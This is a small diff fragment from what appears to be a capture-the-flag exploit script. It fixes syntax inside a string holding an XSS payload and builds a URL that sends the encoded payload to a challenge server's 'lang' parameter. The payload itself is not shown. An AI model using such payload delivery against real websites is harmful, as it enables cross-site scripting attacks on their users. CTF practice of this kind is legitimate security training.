@@ -33,7 +33,7 @@
 
                     // Debug: Log confirmation after form submission
                     console.log("[Debug] Form submitted successfully.");
-                } // `;
+                }; // `;
             
             // Construct the URL for the vulnerable endpoint with the properly encoded XSS payload
             const targetUrl = 'http://chal2.lagncra.sh:8426/?lang=' + encodeURIComponent(xssPayload);
